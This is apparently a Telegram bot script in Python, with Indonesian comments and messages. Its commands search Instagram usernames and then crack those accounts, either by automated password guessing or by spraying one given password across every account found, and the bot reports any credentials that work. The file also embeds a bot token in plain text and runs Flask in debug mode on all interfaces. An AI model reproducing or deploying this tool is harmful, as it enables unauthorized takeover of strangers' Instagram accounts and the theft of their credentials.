import igtools
from flask import Flask,request
from requests import get
import os


token = '1086170630:AAH7we8c1Y2O22AkhTDYh5zmx9DxnN4vog4'
url = 'https://api.telegram.org/bot%s/' % token


otakBot = Flask(__name__)

def update(update):
	global id,np
	id = update['message']['chat']['id']
	try:
		np = update['message']['from']['username']
	except:
		np = update['message']['from']['first_name']
	tek = update['message']['text']
	cm = tek.split(' ')
	if 'new_chat_member' in str(update):
		nama_grup = update['message']['chat']['title']
		grup_id   = update['message']['chat']['id']
		mem_baru  = update['message']['new_chat_member']['first_name']
		teks      = 'Hai %s !\nSelamat datang di Grup %s' %(mem_baru,nama_grup)
		kirim_pesan(grup_id,teks)
	elif cm[0] == '/search':
		for i in igtools.search(cm[1]):
			kirim_pesan(id,i)
	elif cm[0] == '/smartcrack':
		for i in igtools.search(cm[1]):
			x=igtools.smartcrack(i)
			if x == False:
				kirim_pesan(id, 'gagal')
			else:
				kirim_pesan(id,str(x))
	elif cm[0] == '/crackfollower':
		for i in igtools.search(cm[1]):
			if igtools.login(i,cm[2]) == True:
				kirim_pesan(id,'username : %s\npassword : %s \nterambil' % (i,cm[2]))
			else:
				kirim_pesan(id,'username : %s\npassword : %s\ngagal' % (i,cm[2]))
     # disini bisa kita tambahin kode lainnya
     # misalnya membalas kalau ada oran yang ngechat ke bot kita 
     # dan kreasikan sesuai imajinasi kalian :)
		id = update['message']['chat']['id']
		kirim_pesan(id,'command :\n/crackfollower <username>\n/search <username>')
def kirim_pesan(id,teks):
	data = {
		'chat_id':id,
		'text':'@%s' % np+' result:\n%s' %teks
	}
	get(url+'sendMessage',params=data)

#sip
@otakBot.route('/',methods=['POST','GET'])
def index():
	if request.method == 'POST':
		data_update = request.get_json()
		update(data_update)
		return "oke"
	else:
		return 'HALAMAN BOT PERTAMA SAYAHALAMAN INI BISA DI GANTI DENGAN KODE HTML'

if __name__ == '__main__':
	otakBot.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')),debug=True)
